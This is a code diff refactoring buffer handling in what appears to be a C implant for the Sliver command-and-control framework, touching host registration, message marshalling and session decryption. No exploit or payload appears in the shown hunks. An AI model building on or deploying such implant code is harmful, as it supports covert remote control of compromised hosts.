@@ -188,10 +188,8 @@ PBUFFER RegisterSliver
 	ElementList[16] = CreateBytesElement(lpLocaleName, lstrlenA(lpLocaleName), 18);
 
 	pFinalElement = CreateStructElement(ElementList, _countof(ElementList), 0);
-	pResult = ALLOC(sizeof(BUFFER));
-	pResult->pBuffer = pFinalElement->pMarshalledData;
+	pResult = BufferMove(pFinalElement->pMarshalledData, pFinalElement->cbMarshalledData);
 	pFinalElement->pMarshalledData = NULL;
-	pResult->cbBuffer = pFinalElement->cbMarshalledData;
 CLEANUP:
 	if (lpHostName != NULL) {
 		FREE(lpHostName);
@@ -272,9 +270,9 @@ PBUFFER MarshalEnvelope
 		FREE(pTemp->SubElements);
 	}
 
-	pResult->pBuffer = pTemp->pMarshalledData;
-	pResult->cbBuffer = pTemp->cbMarshalledData;
-	FREE(pTemp);
+	pResult = BufferMove(pTemp->pMarshalledData, pTemp->cbMarshalledData);
+	pTemp->pMarshalledData = NULL;
+	FreeElement(pTemp);
 	return pResult;
 }
 
@@ -332,11 +330,8 @@ PENVELOPE CreateErrorRespEnvelope
 	RespElement = CreateStructElement(ElementList, _countof(ElementList), dwFieldIdx);
 	FinalElement = CreateStructElement(&RespElement, 1, 0);
 	pResult = ALLOC(sizeof(ENVELOPE));
-	pResult->pData = ALLOC(sizeof(BUFFER));
-	pResult->pData->cbBuffer = FinalElement->cbMarshalledData;
-	pResult->pData->pBuffer = FinalElement->pMarshalledData;
+	pResult->pData = BufferMove(FinalElement->pMarshalledData, FinalElement->cbMarshalledData);
 	FinalElement->pMarshalledData = NULL;
-	FinalElement->cbMarshalledData = 0;
 	pResult->uID = uEnvelopeID;
 	
 	FreeElement(ElementList[0]);
@@ -426,8 +421,6 @@ PBUFFER SliverDecrypt
 	pTemp = pNonce + CHACHA20_NONCE_SIZE;
 	//cbCipherText = pCipherText->cbBuffer - MINISIGN_SIZE - CHACHA20_NONCE_SIZE;
 	cbCipherText = pCipherText->cbBuffer - CHACHA20_NONCE_SIZE;
-	pResult = ALLOC(sizeof(BUFFER));
-	pResult->pBuffer = ALLOC(cbCipherText);
 	pResult = Chacha20Poly1305DecryptAndVerify(pConfig->pSessionKey, pNonce, pTemp, cbCipherText, NULL, 0);
 	if (pResult->pBuffer == NULL || pResult->cbBuffer == 0) {
 		goto CLEANUP;
